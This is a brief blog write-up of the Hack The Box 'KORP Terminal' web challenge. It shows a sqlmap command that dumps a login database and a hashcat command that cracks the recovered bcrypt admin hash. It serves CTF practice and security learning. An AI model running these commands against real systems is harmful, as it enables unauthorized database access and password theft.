---
layout: post
title:  "KORP Terminal"
date:   2025-04-09 20:30:00 -0400
categories: HTB-challenge web very-easy
tags: HTB CTF writeup sqlmap hashcat 
---

### SOLUTION
We can see the login page at first, let try some SQL injection. But nothing happend, so we need to inspect it and save the request to a file.
![](assets/img/htb/korpterminal/1.png)

Using `sqlmap` to find the web's databse
```bash
sqlmap -r request.txt --ignore-code 401 --dump --batch
```
![](assets/img/htb/korpterminal/2.png)

We got the `username` and the `hash`. Now let identify the hash using [Hash Identifier](https://hashes.com/en/tools/hash_identifier)
![](assets/img/htb/korpterminal/3.png)

We have the hash type, now look it up through `hashcat`
![](assets/img/htb/korpterminal/4.png)

Crack it and we get the admin's password.
```bash
hashcat -m 3200 hash.txt wordlist
```
![](assets/img/htb/korpterminal/5.png)
